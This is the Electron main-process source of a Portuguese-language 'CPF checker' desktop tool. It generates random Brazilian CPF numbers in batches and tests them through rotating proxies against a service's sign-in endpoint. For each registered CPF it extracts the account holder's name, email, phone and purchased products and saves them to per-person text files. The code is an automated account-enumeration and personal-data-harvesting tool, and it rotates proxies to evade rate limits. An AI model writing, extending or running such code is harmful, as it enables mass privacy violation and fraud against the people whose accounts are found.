const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');
const CPFGenerator = require('../cpf-generator');
const GemeosChecker = require('../api-checker');
const fs = require('fs-extra');

let mainWindow;
let checker;
let isRunning = false;
let sessionStats = {
  totalVerified: 0,
  validFound: 0,
  startTime: null,
  intervalId: null
};

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1920,
    height: 1080,
    fullscreen: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    },
    title: 'Gemeos CPF Checker - Interface Profissional',
    icon: path.join(__dirname, '../logo.png'),
    show: false,
    frame: true,
    titleBarStyle: 'default'
  });

  mainWindow.loadFile(path.join(__dirname, 'index.html'));
  
  // Mostra a janela quando estiver pronta
  mainWindow.once('ready-to-show', () => {
    mainWindow.show();
  });
  
  // Abre DevTools em desenvolvimento (comentar em produção)
  // mainWindow.webContents.openDevTools();
}

app.whenReady().then(() => {
  createWindow();
  
  // Carrega proxies automaticamente quando a interface é aberta
  setTimeout(async () => {
    if (mainWindow && !mainWindow.isDestroyed()) {
      const checker = new GemeosChecker({
        delay: 5000,
        timeout: 15000,
        maxRetries: 2
      });
      
      mainWindow.webContents.send('proxy-loading-start');
      mainWindow.webContents.send('log-message', {
        type: 'info',
        message: '🔄 Carregando proxies da Webshare...'
      });
      
      const progressCallback = (count) => {
        mainWindow.webContents.send('proxy-loading-progress', { count });
      };
      
      await checker.loadProxies(progressCallback);
      
      mainWindow.webContents.send('proxy-loading-complete', { total: checker.proxies.length });
      mainWindow.webContents.send('log-message', {
        type: 'success',
        message: `✅ ${checker.proxies.length} proxies carregados com sucesso!`
      });
    }
  }, 2000); // Aguarda 2 segundos para a interface carregar
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// IPC Handlers
ipcMain.handle('start-checking', async (event, config) => {
  if (isRunning) return { success: false, message: 'Verificação já está em execução' };
  
  isRunning = true;
  sessionStats.totalVerified = 0;
  sessionStats.validFound = 0;
  sessionStats.startTime = new Date();
  
  checker = new GemeosChecker({
    delay: config.delay || 5000,
    timeout: 15000,
    maxRetries: 2
  });
  
  // Inicia verificação contínua
  startContinuousChecking(config);
  
  return { success: true, message: 'Verificação iniciada' };
});

ipcMain.handle('stop-checking', async () => {
  isRunning = false;
  if (sessionStats.intervalId) {
    clearTimeout(sessionStats.intervalId);
    sessionStats.intervalId = null;
  }
  
  return { success: true, message: 'Verificação parada' };
});

ipcMain.handle('get-stats', async () => {
  const elapsed = sessionStats.startTime ? new Date() - sessionStats.startTime : 0;
  const elapsedMinutes = Math.floor(elapsed / 60000);
  const elapsedHours = Math.floor(elapsedMinutes / 60);
  const remainingMinutes = elapsedMinutes % 60;
  
  return {
    totalVerified: sessionStats.totalVerified,
    validFound: sessionStats.validFound,
    elapsedTime: `${elapsedHours}h ${remainingMinutes}m`,
    isRunning: isRunning,
    successRate: sessionStats.totalVerified > 0 ? 
      ((sessionStats.validFound / sessionStats.totalVerified) * 100).toFixed(3) : '0.000'
  };
});

ipcMain.handle('open-results-folder', async () => {
  const { shell } = require('electron');
  
  // Usar o diretório de trabalho atual (onde o executável está rodando)
  const listaPath = path.resolve(process.cwd(), 'lista');
  
  // Garantir que a pasta lista existe
  if (!fs.existsSync(listaPath)) {
    fs.mkdirSync(listaPath, { recursive: true });
  }
  
  try {
    await shell.openPath(listaPath);
    console.log(`📁 Pasta aberta: ${listaPath}`);
  } catch (error) {
    console.error('❌ Erro ao abrir pasta:', error.message);
    // Fallback: abrir pasta pai
    await shell.openPath(path.dirname(listaPath));
  }
});

ipcMain.handle('generate-test-cpf', async () => {
  return CPFGenerator.generate();
});

ipcMain.handle('test-single-cpf', async (event, cpf) => {
  if (!checker) {
    checker = new GemeosChecker({
      delay: 5000,
      timeout: 15000,
      maxRetries: 2
    });
  }
  
  try {
    const result = await checker.checkCPF(cpf);
    
    // Envia resultado para interface
    mainWindow.webContents.send('cpf-checking', { 
      cpf, 
      count: 1 
    });
    
    if (result.success) {
      let status = 'not_registered';
      let message = 'CPF NÃO CADASTRADO';
      let userData = null;
      let products = [];
      
      if (result.data && result.data.signIn === true) {
        // CPF não cadastrado
        status = 'not_registered';
        message = 'CPF NÃO CADASTRADO';
      } else if (result.data && (result.data.signIn === false || (result.data.user && result.data.accessToken))) {
        // CPF cadastrado
        status = 'registered';
        message = 'CPF CADASTRADO';
        
        if (result.data.user) {
          userData = {
            id: result.data.user.id,
            name: result.data.user.name,
            email: result.data.user.email,
            phone: result.data.user.phone
          };
        }
        
        if (result.products && result.products.success && result.products.data) {
          products = result.products.data.map(product => ({
            id: product.productId?._id || 'N/A',
            title: product.productId?.title || 'Produto sem título'
          }));
        }
        
        // Salva CPF válido se for cadastrado
        await saveSingleValidCPF(cpf, result, true);
      }
      
      mainWindow.webContents.send('cpf-result', {
        cpf,
        status,
        message,
        userData,
        products
      });
    } else {
      mainWindow.webContents.send('cpf-result', {
        cpf,
        status: 'error',
        message: `Erro: ${result.error}`,
        errorCode: result.status
      });
    }
    
    return { success: true, result };
  } catch (error) {
    mainWindow.webContents.send('cpf-result', {
      cpf,
      status: 'error',
      message: `Erro: ${error.message}`
    });
    
    return { success: false, error: error.message };
  }
});

async function startContinuousChecking(config) {
  if (!isRunning) return;
  
  try {
    // Carrega proxies se ainda não foram carregados
    if (checker.proxies.length === 0) {
      mainWindow.webContents.send('proxy-loading-start');
      mainWindow.webContents.send('log-message', {
        type: 'info',
        message: '🔄 Carregando proxies da Webshare...'
      });
      
      // Callback para reportar progresso real
      const progressCallback = (count) => {
        mainWindow.webContents.send('proxy-loading-progress', { count });
      };
      
      await checker.loadProxies(progressCallback);
      
      mainWindow.webContents.send('proxy-loading-complete', { total: checker.proxies.length });
      mainWindow.webContents.send('log-message', {
        type: 'success',
        message: `✅ ${checker.proxies.length} proxies carregados com sucesso!`
      });
    }
    
    // Gera lote de CPFs
    const batchSize = config.batchSize || 20;
    const cpfs = CPFGenerator.generateMultiple(batchSize);
    
    // Envia informações do lote para interface
    const batchNumber = Math.floor(sessionStats.totalVerified / batchSize) + 1;
    mainWindow.webContents.send('batch-info', {
      batchNumber,
      batchSize: cpfs.length,
      cpfs: cpfs.slice(0, 3), // Primeiros 3 CPFs para exibir
      totalCpfs: cpfs.length
    });
    
    // Verifica lote de CPFs
    const results = await checker.checkMultipleCPFs(cpfs);
    
    // Processa resultados do lote
    let validCPFsInBatch = 0;
    let errorsInBatch = 0;
    
    results.forEach(result => {
      sessionStats.totalVerified++;
      
      if (result.success) {
        // Envia informações do proxy usado
        if (result.proxy && result.proxy !== 'Sem Proxy') {
          mainWindow.webContents.send('proxy-info', {
            cpf: result.cpf,
            proxy: result.proxy,
            hasAuth: result.proxy.includes('Auth') || false
          });
        }
        
        // Processa resultado
        if (result.data && result.data.signIn === true) {
          mainWindow.webContents.send('cpf-result', {
            cpf: result.cpf,
            status: 'not_registered',
            message: 'CPF NÃO CADASTRADO',
            proxy: result.proxy
          });
        } else if (result.data && (result.data.signIn === false || (result.data.user && result.data.accessToken))) {
          // CPF cadastrado
          validCPFsInBatch++;
          sessionStats.validFound++;
          
          let userData = null;
          let products = [];
          
          if (result.data.user) {
            userData = {
              id: result.data.user.id,
              name: result.data.user.name,
              email: result.data.user.email,
              phone: result.data.user.phone
            };
          }
          
          if (result.products && result.products.success && result.products.data) {
            products = result.products.data.map(product => ({
              id: product.productId?._id || 'N/A',
              title: product.productId?.title || 'Produto sem título'
            }));
          }
          
          mainWindow.webContents.send('cpf-result', {
            cpf: result.cpf,
            status: 'registered',
            message: 'CPF CADASTRADO',
            userData,
            products,
            proxy: result.proxy
          });
          
          // Salva CPF válido
          saveSingleValidCPF(result.cpf, result, false);
        } else {
          mainWindow.webContents.send('cpf-result', {
            cpf: result.cpf,
            status: 'unknown',
            message: 'Resposta não identificada',
            proxy: result.proxy
          });
        }
      } else {
        errorsInBatch++;
        mainWindow.webContents.send('cpf-result', {
          cpf: result.cpf,
          status: 'error',
          message: `Erro: ${result.error}`,
          proxy: result.proxy
        });
      }
    });
    
    // Envia resumo do lote
    mainWindow.webContents.send('batch-summary', {
      validCPFsInBatch,
      errorsInBatch,
      totalValid: sessionStats.validFound,
      totalVerified: sessionStats.totalVerified
    });
    
    // Continua verificação após delay
    if (isRunning) {
      sessionStats.intervalId = setTimeout(() => {
        startContinuousChecking(config);
      }, config.delay || 5000);
    }
    
  } catch (error) {
    mainWindow.webContents.send('cpf-result', {
      cpf: 'ERRO',
      status: 'error',
      message: `Erro fatal: ${error.message}`
    });
    
    // Reinicia após erro
    if (isRunning) {
      sessionStats.intervalId = setTimeout(() => {
        startContinuousChecking(config);
      }, 10000);
    }
  }
}

async function saveValidCPF(result) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  
  // Criar nome do arquivo baseado no nome da pessoa
  let personName = 'Desconhecido';
  if (result.data && result.data.user && result.data.user.name) {
    // Limpar nome para usar como nome de arquivo
    personName = result.data.user.name
      .replace(/[<>:"/\\|?*]/g, '') // Remover caracteres inválidos
      .replace(/\s+/g, '_') // Substituir espaços por underscore
      .substring(0, 50); // Limitar tamanho
  }
  
  const filename = `lista/validado-${personName}-${result.cpf}.txt`;
  
  let txtContent = '';
  txtContent += '🔍 GEMEOS CPF CHECKER - CPF VÁLIDO ENCONTRADO (GUI)\n';
  txtContent += '='.repeat(55) + '\n\n';
  txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
  txtContent += `🔢 CPF: ${result.cpf}\n`;
  txtContent += `✅ Status: CADASTRADO\n\n`;
  
  if (result.data.user) {
    txtContent += `👤 DADOS DO USUÁRIO:\n`;
    txtContent += `   🆔 ID: ${result.data.user.id}\n`;
    txtContent += `   📛 Nome: ${result.data.user.name}\n`;
    txtContent += `   📧 Email: ${result.data.user.email}\n`;
    txtContent += `   📱 Telefone: ${result.data.user.phone}\n\n`;
  }
  
  if (result.products && result.products.success && result.products.data && result.products.data.length > 0) {
    txtContent += `📦 PRODUTOS/TÍTULOS:\n`;
    result.products.data.forEach((product, index) => {
      txtContent += `   ${index + 1}. ${product.productId?.title || 'Produto sem título'}\n`;
      if (product.productId?._id) {
        txtContent += `      🆔 ID: ${product.productId._id}\n`;
      }
    });
    txtContent += '\n';
  }
  
  txtContent += '='.repeat(55) + '\n';
  txtContent += '💾 Salvo automaticamente pela Interface Gráfica\n';
  txtContent += '='.repeat(55) + '\n';
  
  // Garantir que a pasta lista existe
  const listaDir = 'lista';
  if (!fs.existsSync(listaDir)) {
    fs.mkdirSync(listaDir, { recursive: true });
  }
  
  await fs.writeFile(filename, txtContent, 'utf8');
  
  mainWindow.webContents.send('cpf-saved', {
    filename,
    cpf: result.cpf
  });
}

async function saveSingleValidCPF(cpf, result, isManualTest = false) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  
  // Criar nome do arquivo baseado no nome da pessoa
  let personName = 'Desconhecido';
  if (result.data && result.data.user && result.data.user.name) {
    // Limpar nome para usar como nome de arquivo
    personName = result.data.user.name
      .replace(/[<>:"/\\|?*]/g, '') // Remover caracteres inválidos
      .replace(/\s+/g, '_') // Substituir espaços por underscore
      .substring(0, 50); // Limitar tamanho
  }
  
  const filename = isManualTest ? 
    `lista/teste-${personName}-${cpf}.txt` : 
    `lista/validado-${personName}-${cpf}.txt`;
  
  let txtContent = '';
  if (isManualTest) {
    txtContent += '🔍 GEMEOS CPF CHECKER - TESTE DE CPF ESPECÍFICO\n';
    txtContent += '='.repeat(55) + '\n\n';
    txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    txtContent += `🔢 CPF: ${cpf}\n`;
    txtContent += `✅ Status: CADASTRADO\n`;
    txtContent += `🧪 Tipo: TESTE MANUAL\n\n`;
  } else {
    txtContent += '🔍 GEMEOS CPF CHECKER - CPF VÁLIDO ENCONTRADO\n';
    txtContent += '='.repeat(55) + '\n\n';
    txtContent += `📅 Data/Hora: ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}\n`;
    txtContent += `🔢 CPF: ${cpf}\n`;
    txtContent += `✅ Status: CADASTRADO\n`;
    txtContent += `🧪 Tipo: VERIFICAÇÃO AUTOMÁTICA\n\n`;
  }
  
  if (result.data.user) {
    txtContent += `👤 DADOS DO USUÁRIO:\n`;
    txtContent += `   🆔 ID: ${result.data.user.id}\n`;
    txtContent += `   📛 Nome: ${result.data.user.name}\n`;
    txtContent += `   📧 Email: ${result.data.user.email}\n`;
    txtContent += `   📱 Telefone: ${result.data.user.phone}\n\n`;
  }
  
  if (result.products && result.products.success && result.products.data && result.products.data.length > 0) {
    txtContent += `📦 PRODUTOS/TÍTULOS:\n`;
    result.products.data.forEach((product, index) => {
      txtContent += `   ${index + 1}. ${product.productId?.title || 'Produto sem título'}\n`;
      if (product.productId?._id) {
        txtContent += `      🆔 ID: ${product.productId._id}\n`;
      }
    });
    txtContent += '\n';
  }
  
  txtContent += '='.repeat(55) + '\n';
  if (isManualTest) {
    txtContent += '💾 Teste realizado via Interface Gráfica\n';
  } else {
    txtContent += '💾 Salvo automaticamente pela Interface Gráfica\n';
  }
  txtContent += '='.repeat(55) + '\n';
  
  // Garantir que a pasta lista existe
  const listaDir = 'lista';
  if (!fs.existsSync(listaDir)) {
    fs.mkdirSync(listaDir, { recursive: true });
  }
  
  await fs.writeFile(filename, txtContent, 'utf8');
  
  mainWindow.webContents.send('cpf-saved', {
    filename,
    cpf: cpf
  });
}
